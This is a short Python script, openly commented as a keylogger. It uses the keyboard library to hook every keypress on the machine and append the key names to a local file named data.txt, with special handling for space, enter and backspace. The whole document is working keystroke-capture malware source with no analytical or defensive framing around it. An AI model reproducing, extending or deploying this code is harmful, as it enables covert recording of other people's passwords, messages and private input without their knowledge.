import keyboard 
#create a file
captured="data.txt"
#removing last character function for deleting last element
def remove_last_character(filename):
    #read file
    with open(filename, 'r') as file:
        contents = file.read()
        if(contents==None):
            pass
    # Truncate the last character
    modified_contents = contents[:-1]
    
    #write new modified content to the file
    with open(filename, 'w') as file:
        file.write(modified_contents)
        
#keylogger program capturing keys        
def on_keypress(event):
    
    with open(captured,'a') as f:
        if(keyboard.is_pressed("space")):
            f.write(" ")
        elif(keyboard.is_pressed("backspace")):
            remove_last_character(captured)
        elif(keyboard.is_pressed("enter")):
            f.write('\n')  
        else:
            f.write('{}'.format(event.name))
        

keyboard.on_press(on_keypress)
keyboard.wait()
     